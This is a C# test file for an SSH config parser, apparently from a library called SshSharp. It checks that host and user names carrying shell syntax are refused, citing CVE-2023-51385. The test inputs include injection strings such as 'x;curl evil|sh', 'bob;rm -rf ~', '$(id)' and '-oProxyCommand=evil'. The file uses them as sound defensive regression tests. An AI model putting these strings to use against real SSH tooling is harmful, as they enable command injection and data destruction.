using SshSharp.Config;

namespace SshSharp.Tests.Config;

/// <summary>Fixes from the M2 review: shell-safe inputs, and places where resolution differed from OpenSSH.</summary>
public class SshConfigHardeningTests
{
    private static readonly SshConfigResolveOptions Options = new()
    {
        LocalUser = "local",
        HomeDirectory = "/home/local",
        LocalHostName = "box",
    };

    // Resolve when no callback is set, ResolveAsync otherwise (the tests' callbacks complete at once).
    private static SshHostConfig Resolve(string config, string host, SshConfigResolveOptions? options = null) =>
        options is { ExecMatcher: not null } or { HostCanonicalizer: not null }
            ? SshConfig.Parse(config).ResolveAsync(host, options).GetAwaiter().GetResult()
            : SshConfig.Parse(config).Resolve(host, options ?? Options);

    [Test]
    [Arguments("x;curl evil|sh")]
    [Arguments("$(id)")]
    [Arguments("a`id`")]
    [Arguments("-oProxyCommand=evil")]
    [Arguments("a\nb")]
    [Arguments("a'b")]
    [Arguments("x -e sh")] // a space would split %h into extra arguments
    [Arguments("x\t-e")]
    public async Task HostNamesThatWouldBeShellSyntax_AreRefused(string host)
    {
        // %h/%n go into Match exec and ProxyCommand, which run in a shell (CVE-2023-51385).
        const string config = "Match exec \"ping -c1 %h\"\n Port 5\nProxyCommand nc %h %p\n";
        var ran = new List<string>();
        var options = new SshConfigResolveOptions { LocalUser = "l", HomeDirectory = "/h", ExecMatcher = (c, _) => { ran.Add(c); return Task.FromResult(false); } };
        await Assert.That(() => Resolve(config, host, options)).Throws<ArgumentException>();
        await Assert.That(ran).IsEmpty();
    }

    [Test]
    [Arguments("bob;rm -rf ~")]
    [Arguments("$(id)")]        // '$' and '\': what OpenSSH 10.6 refuses in a user name from its command line (#217)
    [Arguments("a$HOME")]
    [Arguments("a\\b")]
    [Arguments("a\nb")]         // control characters: OpenSSH 10.1
    [Arguments("a\u0007b")]
    [Arguments("-oProxyCommand=evil")]
    public async Task UserNamesThatWouldBeShellSyntax_AreRefused(string user)
    {
        // The user name from the caller goes into Match exec and ProxyCommand (%r), which run in a shell. A user name from the config
        // file itself is trusted as written, as OpenSSH trusts it.
        const string config = "Match exec \"test %r\"\n Port 5\nProxyCommand nc %h %p %r\n";
        var ran = new List<string>();
        var options = new SshConfigResolveOptions { LocalUser = "l", HomeDirectory = "/h", User = user, ExecMatcher = (c, _) => { ran.Add(c); return Task.FromResult(false); } };
        await Assert.That(() => Resolve(config, "a", options)).Throws<ArgumentException>();
        await Assert.That(ran).IsEmpty();
    }

    [Test]
    public async Task OrdinaryUserNamesWork_AndAConfigFileUserIsTrustedAsWritten()
    {
        var good = new SshConfigResolveOptions { LocalUser = "l", HomeDirectory = "/h", User = "first.last@corp" };
        await Assert.That(Resolve("Host *\n Port 2\n", "web-01.example.com", good).User).IsEqualTo("first.last@corp");

        // A Windows account name with a space, and a DOMAIN\user name, written in the config file.
        await Assert.That(Resolve("Host *\n User \"Jane Doe\"\n", "a").User).IsEqualTo("Jane Doe");
        await Assert.That(Resolve("Host *\n User CORP\\jane\n", "a").User).IsEqualTo("CORP\\jane");
    }

    [Test]
    public async Task TheFinalPass_MatchesHostSectionsAgainstTheCanonicalName()
    {
        const string config = "CanonicalizeHostname yes\nCanonicalDomains corp.example.com\nHost *.corp.example.com\n User svc\n";
        var options = new SshConfigResolveOptions { LocalUser = "l", HomeDirectory = "/h", HostCanonicalizer = (h, _, _) => Task.FromResult<string?>(h + ".corp.example.com") };
        var c = Resolve(config, "web", options);
        await Assert.That(c.HostName).IsEqualTo("web.corp.example.com");
        await Assert.That(c.User).IsEqualTo("svc");
    }

    [Test]
    public async Task TheFinalPass_MatchesHostSectionsAgainstTheHostName_Lowercased()
    {
        // "Match final" forces the second pass without canonicalization: Host now sees HostName, lowercased.
        const string config = "Host alias\n HostName Real.Example.COM\nMatch final\n Port 2\nHost real.example.com\n User r\n";
        var c = Resolve(config, "alias");
        await Assert.That(c.User).IsEqualTo("r");
        await Assert.That(c.Port).IsEqualTo(2);
    }

    [Test]
    public async Task ProxyJumpAndProxyCommand_TheFirstOneWins()
    {
        var jumpFirst = Resolve("Host b\n ProxyJump bastion\nHost *\n ProxyCommand nc %h %p\n", "b");
        await Assert.That(jumpFirst.ProxyJump).IsEquivalentTo(new[] { "bastion" });
        await Assert.That(jumpFirst.ProxyCommand).IsNull();

        var commandFirst = Resolve("Host b\n ProxyCommand nc %h %p\nHost *\n ProxyJump bastion\n", "b");
        await Assert.That(commandFirst.ProxyCommand).IsEqualTo("nc b 22");
        await Assert.That(commandFirst.ProxyJump).IsEmpty();

        // "none" counts as the first one too.
        var none = Resolve("Host b\n ProxyCommand none\nHost *\n ProxyJump bastion\n", "b");
        await Assert.That(none.ProxyCommand).IsNull();
        await Assert.That(none.ProxyJump).IsEmpty();
    }

    [Test]
    public async Task HostKeyAliasAndProxyJumpTokens_Expand()
    {
        var c = Resolve("Host a\n HostKeyAlias alias1\n ProxyJump j1\n UserKnownHostsFile ~/.ssh/kh/%k\n IdentityFile ~/.ssh/%j-key\n", "a");
        await Assert.That(c.UserKnownHostsFiles.Single()).IsEqualTo("/home/local/.ssh/kh/alias1");
        await Assert.That(c.IdentityFiles.Single()).IsEqualTo("/home/local/.ssh/j1-key");
        await Assert.That(c.HostKeyAlias).IsEqualTo("alias1");

        // Without HostKeyAlias, %k is the host name.
        var plain = Resolve("Host a\n HostName real\n UserKnownHostsFile /kh/%k\n", "a");
        await Assert.That(plain.UserKnownHostsFiles.Single()).IsEqualTo("/kh/real");
    }

    [Test]
    public async Task KnownHostsFileNone_MeansNoFile()
    {
        var c = Resolve("Host *\n UserKnownHostsFile none\n GlobalKnownHostsFile none\n", "a");
        await Assert.That(c.UserKnownHostsFiles).IsEmpty();
        await Assert.That(c.GlobalKnownHostsFiles).IsEmpty();
    }

    [Test]
    [Arguments("Match version 9.9\n Port 5\n")]
    [Arguments("Match !sessiontype shell\n Port 5\n")]
    [Arguments("Match all command uptime\n Port 5\n")]
    public async Task MatchCriteriaThatCannotBeEvaluated_NeverApply(string config)
    {
        await Assert.That(Resolve(config, "a").Port).IsEqualTo(22);
    }

    [Test]
    public async Task SingleQuotedArguments_KeepTheirSpaces()
    {
        var c = Resolve("Host *\n IdentityFile '~/My Keys/id'\n IdentityFile \"/a b/c\"\n", "a");
        await Assert.That(c.IdentityFiles).IsEquivalentTo(new[] { "/home/local/My Keys/id", "/a b/c" });
    }

    [Test]
    public async Task RunShell_PassesQuotesThroughToTheShell()
    {
        var command = OperatingSystem.IsWindows()
            ? "if \"a b\"==\"a b\" (exit 0) else (exit 1)"
            : "test \"a b\" = 'a b'";
        await Assert.That(await SshExecMatcher.RunShellAsync(command)).IsTrue();
    }
}
